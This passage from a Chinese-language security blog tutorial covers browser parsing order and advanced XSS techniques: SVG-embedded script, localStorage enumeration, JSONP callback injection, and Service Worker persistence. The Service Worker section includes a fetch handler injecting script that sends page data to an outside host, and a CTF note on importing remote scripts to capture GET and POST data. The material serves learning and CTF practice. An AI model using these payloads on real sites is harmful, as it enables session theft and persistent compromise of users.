+其次，HTML解析是在URL解析之前的，所以在进行URL解析之前，Scheme部分的&quot;javascript&quot;字符串已被解码，而并不再是被实体编码的状态。
+</code></pre><h3 id="解析顺序示例">解析顺序示例</h3>
+<blockquote>
+<p>示例：</p>
+<pre tabindex="0"><code>&lt;a href=&quot;UserInput&quot;&gt;&lt;/a&gt;
+</code></pre><p>该例子中，首先由 HTML 解析器对 UserInput 部分进行字符实体解码；接着 URL 解析器对 UserInput 进行 URL decode；如果 URL 的 Scheme 部分为 javascript 的话，JavaScript 解析器会再对 UserInput 进行解码。</p>
+<p>解析顺序：HTML 解析-&gt;URL 解析-&gt;JavaScript 解析</p>
+</blockquote>
+<blockquote>
+<p>示例：</p>
+<pre tabindex="0"><code>&lt;a href=# onclick=&quot;window.open('UserInput')&quot;&gt;&lt;/a&gt;
+</code></pre><p>该例子中，首先由 HTML 解析器对 UserInput 部分进行字符实体解码；接着由 JavaScript 解析器会再对 onclick 部分的 JS 进行解析并执行 JS；执行 JS 后 window.open(‘UserInput’) 函数的参数会传入 URL，所以再由 URL 解析器对 UserInput 部分进行解码。</p>
+<p>解析顺序：HTML 解析-&gt;JavaScript 解析-&gt;URL 解析</p>
+</blockquote>
+<blockquote>
+<p>示例：</p>
+<pre tabindex="0"><code>&lt;a href=&quot;javascript:window.open('UserInput')&quot;&gt;
+</code></pre><p>该例子中，首先还是由 HTML 解析器对 UserInput 部分进行字符实体解码；接着由 URL 解析器解析 href 的属性值；然后由于 Scheme 为 javascript，所以由 JavaScript 解析；解析执行 JS 后 window.open(‘UserInput’) 函数传入 URL，所以再由 URL 解析器解析。</p>
+<p>解析顺序：HTML 解析-&gt;URL 解析-&gt;JavaScript 解析-&gt;URL 解析。</p>
+</blockquote>
+<h2 id="xss高阶利用方式">XSS高阶利用方式</h2>
+<h3 id="svg下的存储型xss">SVG下的存储型XSS</h3>
+<p>可缩放矢量图形(Scalable Vector Graphics，SVG)是W3C推出的基于XML的二维矢量图形标准。SVG可以提供高质量的矢量图形渲染，同时由于支持JavaScript和文档对象模型，SVG图形通常具有强大的交互能力。</p>
+<p>例子：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt;
+</span><span class="err">&lt;svg width=&#34;100%&#34; height=&#34;100%&#34; version=&#34;1.1&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
+</span><span class="err">	&lt;rect width=&#34;100&#34; height=&#34;100&#34; style=&#34;fill:rgb(0,0,255);stroke-width:1;stroke:rgb(0,0,0)&#34; /&gt;
+</span><span class="err">  &lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;
+</span><span class="err">&lt;/svg&gt;
+</span></code></pre></div><p>存储型XSS：</p>
+<pre tabindex="0"><code># 正常业务
+文件上传 -&gt; 上传SVG图片 -&gt; SVG图片存储至服务器
+
+# 利用
+嵌入XSS代码 -&gt; 上传该SVG -&gt; 用户访问该图片 -&gt; 执行JS脚本
+</code></pre><h3 id="svg下的窃取web-storage">SVG下的窃取Web Storage</h3>
+<p>Web Storage是HTML5中本地存储的解决方案之一，但并不是为了取代cookie而制定的标准，cookie作为HTTP协议的一部分用来处理客户端和服务器通信是不可或缺的，session正是依赖于cookie实现客户端状态保持。WebStorage的意图在于解决本来不应该cookie做，却不得不用cookie的本地存储。</p>
+<p>cookie的缺陷：</p>
+<ul>
+<li>数据大小：仅有4KB，无法满足复杂的业务需求</li>
+<li>网络传输：cookie会附加在每个HTTP请求中，流量负担</li>
+</ul>
+<p>Web Storage提供两种类型的API：localStorage和sessionStorage。localStorage在本地永久性存储数据，除非显式将其删除或清空，sessionStorage存储的数据只在会话期间有效，关闭浏览器则自动删除。两个对象都有共同的API。</p>
+<p>与cookie相比的优势：</p>
+<ul>
+<li>容量上讲Web Storage一般提供5M的存储空间</li>
+<li>安全性上WebStorage并不作为HTTP header发送</li>
+</ul>
+<blockquote>
+<p>利用SVG盗取localStorage</p>
+<pre tabindex="0"><code>&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;
+&lt;svg version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; &gt;
+    &lt;rect width=&quot;100&quot; height=&quot;100&quot; /&gt;
+    &lt;script&gt;
+        if(localStorage.length)
+        {
+            for(key in localStorage)
+            {
+                if(localStorage.getItem(key))
+                {
+                    console.log(&quot;key:&quot; + key);
+                    console.log(&quot;value&quot; + localStorage.getItem(key));
+                }
+            }
+        }
+    &lt;/script&gt;
+&lt;/svg&gt;
+</code></pre></blockquote>
+<h3 id="jsonp劫持">JSONP劫持</h3>
+<h4 id="jsonp">JSONP</h4>
+<p>script标签是可以加载异域的JavaScript并执行的，并可以通过预先设定好的callback函数来实现和非同源页面的交互。</p>
+<p>某网站的客户端代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>JSONP 实例<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;divCustomers&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
+<span class="kd">function</span> <span class="nx">callbackFunction</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="s1">&#39;&lt;ul&gt;&#39;</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">result</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nx">html</span> <span class="o">+=</span> <span class="s1">&#39;&lt;li&gt;&#39;</span> <span class="o">+</span> <span class="nx">result</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;&lt;/li&gt;&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nx">html</span> <span class="o">+=</span> <span class="s1">&#39;&lt;/ul&gt;&#39;</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;divCustomers&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">html</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div><p>服务端jsonp.php代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-type: application/json&#39;</span><span class="p">);</span>
+<span class="c1">//获取回调函数名
+</span><span class="c1"></span><span class="nv">$jsoncallback</span> <span class="o">=</span> <span class="nv">$_REQUEST</span> <span class="p">[</span><span class="s1">&#39;jsoncallback&#39;</span><span class="p">];</span>
+<span class="c1">//json数据
+</span><span class="c1"></span><span class="nv">$json_data</span> <span class="o">=</span> <span class="s1">&#39;[&#34;customername1&#34;,&#34;customername2&#34;]&#39;</span><span class="p">;</span>
+<span class="c1">//输出jsonp格式的数据
+</span><span class="c1"></span><span class="k">echo</span> <span class="nv">$jsoncallback</span> <span class="o">.</span> <span class="s2">&#34;(&#34;</span> <span class="o">.</span> <span class="nv">$json_data</span> <span class="o">.</span> <span class="s2">&#34;)&#34;</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>劫持：</p>
+<p>修改<code>https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction</code>中jsoncallback这个参数值为<code>&lt;scrip&gt;alert('1');&lt;/script&gt;</code>，则输出至前端的数据为<code>&lt;scrip&gt;alert('1');&lt;/script&gt;[&quot;customername1&quot;,&quot;customername2&quot;]</code>。</p>
+<p>如果前端Content-Type未设置或者是text/html、application/json，则响应到客户端的内容就会触发执行JS脚本。</p>
+<h3 id="持久化之service-worker">持久化之Service Worker</h3>
+<p>Service Worker技术基于web worker使得Web 应用离线缓存成为可能，更为后台同步、通知推送等功能提供了思路。</p>
+<p>该技术最核心的一个特性就是：Service Worker 工作线程独立于浏览器主线程，并且与当前的浏览器主线程完全隔离，并且可以用 JS 代码来拦截浏览器当前域的HTTP 请求。</p>
+<blockquote>
+<p>它注册在指定源和路径下的事件驱动worker。它采用JavaScript控制关联的页面或者网站，拦截并修改访问和资源请求，细粒度地缓存资源。能够完全控制应用在特定情形（最常见的情形是网络不可用）下的表现。并且由于service worker工作于worker上下文，因此它不能访问DOM。</p>
+</blockquote>
+<blockquote>
+<p>注意点：</p>
+<ul>
+<li>只能注册同源下的js</li>
+<li>网站必须是<code>https://</code>或者<code>http://localhost/</code></li>
+<li>Content-Type 为 */javascript</li>
+<li>Worker 线程不能获得下列对象：DOM对象，Windows对象，document对象，parent对象</li>
+</ul>
+</blockquote>
+<h4 id="service-worker生命周期">Service Worker生命周期</h4>
+<blockquote>
+<p>install -&gt; installed -&gt; activating -&gt; =active -&gt; activated -&gt; redundant</p>
+</blockquote>
+<p>进入redundant (废弃)状态的原因可能是：</p>
+<ul>
+<li>安装(install)失败</li>
+<li>激活(activating)失败</li>
+<li>新版本的 Service Worker 替换了它并成为激活状态</li>
+</ul>
+<h4 id="注册">注册</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">register</span><span class="p">(</span><span class="s1">&#39;/haha/test.js&#39;</span><span class="p">,{</span><span class="nx">scope</span><span class="o">:</span><span class="s2">&#34;/&#34;</span><span class="p">})</span>
+</code></pre></div><p>Service Worker 的注册路径决定了其 <code>scope</code> (默认作用范围)。示例中的<code>test.js</code> 是在<code> /haha/</code> 下，这使得该 Service Worker 默认只会收到<code>/haha/</code>下的fetch 事件。如果存放在网站的根路径下，则将会收到该网站的所有 fetch 事件。</p>
+<p>如果希望改变它的作用域，可在第二个参数设置 scope 范围。</p>
+<h4 id="安装">安装</h4>
+<p>本地注册一个根目录下的Service Worker 脚本，作用域范围<code>http://localhost:8000/</code>：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 215; 
+			flex-basis: 517px"
+	>
+	<a href="/p/xss/image-20220122111424321.png" data-size="1215x564">
+		<img src="/p/xss/image-20220122111424321.png"
+			width="1215"
+			height="564"
+			srcset="/p/xss/image-20220122111424321_hua9223e03181c42bc68d88d61a3dbf862_73717_480x0_resize_box_3.png 480w, /p/xss/image-20220122111424321_hua9223e03181c42bc68d88d61a3dbf862_73717_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>sw_test.js：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">//监控install事件
+</span><span class="c1"></span><span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;install&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">){</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;install&#34;</span><span class="p">)</span>
+<span class="p">})</span>
+<span class="c1">//监控activate事件
+</span><span class="c1"></span><span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;activate&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">){</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;activate&#34;</span><span class="p">)</span>
+<span class="p">})</span>
+ 
+<span class="c1">//监控fetch事件
+</span><span class="c1"></span><span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">){</span>
+    <span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span><span class="k">new</span> <span class="nx">Response</span><span class="p">(</span><span class="s1">&#39;&lt;script&gt;alert(/xss/);&lt;/script&gt;&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">headers</span><span class="o">:</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s2">&#34;text/html&#34;</span><span class="p">}}))</span>
+<span class="p">})</span>
+</code></pre></div><p>刷新页面：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 343; 
+			flex-basis: 824px"
+	>
+	<a href="/p/xss/image-20220122111449892.png" data-size="457x133">
+		<img src="/p/xss/image-20220122111449892.png"
+			width="457"
+			height="133"
+			srcset="/p/xss/image-20220122111449892_hu3b603e317c0e5c8829ea78640f6ceab8_4438_480x0_resize_box_3.png 480w, /p/xss/image-20220122111449892_hu3b603e317c0e5c8829ea78640f6ceab8_4438_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h4 id="无感外带信息">无感外带信息</h4>
+<p>sw_test.js:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">//监听一个特定的url，如果是，则修改响应实现外带当前域的一些信息，例如document.cookie
+</span><span class="c1"></span>
+<span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span>
+    <span class="nx">caches</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">){</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">fetch</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">));</span>
+        <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">clone</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">url</span> <span class="o">==</span> <span class="s1">&#39;http://localhost:8000/mytest.js&#39;</span><span class="p">){</span>
+            <span class="k">return</span> <span class="k">new</span> <span class="nx">Response</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;var httpRequest = new XMLHttpRequest();httpRequest.open(&#39;GET&#39;, &#39;http://192.168.0.102:8888/&#39; + document.doamin, true);httpRequest.send();&lt;/script&gt;&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nx">headers</span><span class="o">:</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s2">&#34;text/html&#34;</span><span class="p">}})</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="k">return</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Response from network is:&#39;</span><span class="p">,</span> <span class="nx">response</span><span class="p">.</span><span class="nx">url</span><span class="p">);</span>
+            <span class="k">return</span> <span class="nx">response</span><span class="p">;</span>
+          <span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Fetching failed:&#39;</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+            <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
+          <span class="p">});</span>
+        <span class="p">}</span>
+    <span class="p">})</span>
+    <span class="p">)</span>
+<span class="p">});</span>
+</code></pre></div><p>访问mytest.js：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 769; 
+			flex-basis: 1846px"
+	>
+	<a href="/p/xss/image-20220122132006689.png" data-size="577x75">
+		<img src="/p/xss/image-20220122132006689.png"
+			width="577"
+			height="75"
+			srcset="/p/xss/image-20220122132006689_hubbd51b7779baf1a8f3c79017f626e2d5_10965_480x0_resize_box_3.png 480w, /p/xss/image-20220122132006689_hubbd51b7779baf1a8f3c79017f626e2d5_10965_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h4 id="ctf例子中的service-worker">CTF例子中的Service Worker</h4>
+<p>2020西湖论剑 hardxss</p>
+<p>参考：https://yanluow.github.io/2020/10/21/xss%E6%8C%81%E4%B9%85%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020hardxss/</p>
+<p>例子中重要的点：</p>
+<ul>
+<li>通过<code>iframe</code>跨域在其他域(其他域设置了父域)执行js</li>
+<li>jsonp接口传入callback参数中：使用<code>self.importScripts('vps_addr/test.js')</code>引入外部js文件，用作service worker的逻辑处理</li>
+<li>窃取GET数据：location.search;窃取POST数据：event.request.body</li>
+</ul>
+<h3 id="持久化之cookie-和-localstorage">持久化之cookie 和 localStorage</h3>
+<p>网站有可能会将信息存储在 Cookie 或 localStorage ，而因为这些数据一般是网站主动存储的，且一般没有或很久没有对 Cookie 或 localStorage 中取出的数据过滤，而是直接展示在页面中。因此当有一个XSS时，可以把payload写入其中，在对应条件下触发。</p>
+<p><strong>参考</strong>：</p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/csrf/">
+        
+        
+            <div class="article-image">
+                <img src="/p/csrf/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CSRF 相关"
+                        data-key="csrf" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CSRF 相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mssql/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mssql/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MSSQL 注入与提权相关"
+                        data-key="mssql" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MSSQL 注入与提权相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-1/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 提权"
+                        data-key="mysql-1" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 提权</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 注入写 shell"
+                        data-key="mysql-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 注入写 shell</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/php-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/php-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PHP 反序列化-2"
+                        data-key="php-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 反序列化-2</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#定义和分类">定义和分类</a></li>
+    <li><a href="#危害">危害</a></li>
+    <li><a href="#反射型xss">反射型XSS</a>
+      <ol>
+        <li><a href="#原理">原理</a></li>
+        <li><a href="#特点">特点</a></li>
+      </ol>
+    </li>
+    <li><a href="#存储型xss">存储型XSS</a>
+      <ol>
+        <li><a href="#原理-1">原理</a></li>
+        <li><a href="#场景">场景</a></li>
+      </ol>
+    </li>
+    <li><a href="#dom型xss">DOM型XSS</a>
+      <ol>
+        <li><a href="#dom">DOM</a></li>
+        <li><a href="#原理-2">原理</a></li>
+      </ol>
+    </li>
+    <li><a href="#常用标签">常用标签</a></li>
+    <li><a href="#xss常见绕过">XSS常见绕过</a>
+      <ol>
+        <li><a href="#关键字过滤">关键字过滤</a></li>
+        <li><a href="#空格过滤">空格过滤</a></li>
+        <li><a href="#单双引号过滤">单双引号过滤</a></li>
+        <li><a href="#括号过滤">括号过滤</a></li>
+        <li><a href="#url过滤">url过滤</a></li>
+      </ol>
+    </li>
+    <li><a href="#xss伪协议绕过">XSS伪协议绕过</a></li>
+    <li><a href="#xss编码绕过">XSS编码绕过</a>
+      <ol>
+        <li><a href="#unicode编码">Unicode编码</a></li>
+        <li><a href="#浏览器解码规则">浏览器解码规则</a></li>
+        <li><a href="#html解析过程">HTML解析过程</a>
+          <ol>
+            <li><a href="#特殊情况">特殊情况</a></li>
+          </ol>
+        </li>
+        <li><a href="#javascript解析">JavaScript解析</a></li>
+        <li><a href="#url解析">URL解析</a></li>
+        <li><a href="#解析顺序示例">解析顺序示例</a></li>
+      </ol>
+    </li>
+    <li><a href="#xss高阶利用方式">XSS高阶利用方式</a>
+      <ol>
+        <li><a href="#svg下的存储型xss">SVG下的存储型XSS</a></li>
+        <li><a href="#svg下的窃取web-storage">SVG下的窃取Web Storage</a></li>
+        <li><a href="#jsonp劫持">JSONP劫持</a>
+          <ol>
+            <li><a href="#jsonp">JSONP</a></li>
+          </ol>
+        </li>
+        <li><a href="#持久化之service-worker">持久化之Service Worker</a>
+          <ol>
+            <li><a href="#service-worker生命周期">Service Worker生命周期</a></li>
+            <li><a href="#注册">注册</a></li>
+            <li><a href="#安装">安装</a></li>
+            <li><a href="#无感外带信息">无感外带信息</a></li>
+            <li><a href="#ctf例子中的service-worker">CTF例子中的Service Worker</a></li>
+          </ol>
+        </li>
+        <li><a href="#持久化之cookie-和-localstorage">持久化之cookie 和 localStorage</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
